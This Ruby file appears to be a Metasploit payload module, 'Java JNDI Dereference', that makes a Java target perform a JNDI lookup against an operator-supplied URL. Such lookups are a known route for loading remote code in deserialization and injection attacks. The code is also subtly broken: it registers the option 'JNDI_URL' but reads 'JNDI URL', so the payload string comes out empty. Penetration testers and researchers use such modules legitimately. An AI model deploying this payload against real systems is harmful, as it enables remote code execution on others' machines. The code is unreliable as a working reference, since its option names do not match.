
module MetasploitModule
  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
                     'Name'          => 'Java JNDI Dereference',
                     'Description'   => 'Invoke JNDI lookup',
                     'Author'        => ['mbechler'],
                     'License'       => MSF_LICENSE,
                     'Platform'      => %w[linux osx solaris unix win],
                     'Arch'          => ARCH_JAVA,
                     'Handler'       => Msf::Handler::None,
                     'Payload'       =>
            {
              'Offsets' => {},
              'Payload' => ''
            }))

    register_options(
      [
        OptString.new('JNDI_URL', [true, 'JNDI URL to lookup'])
      ]
    )
  end

  def generate
    super + command_string
  end

  def command_string
    datastore['JNDI URL'] || ''
  end
end
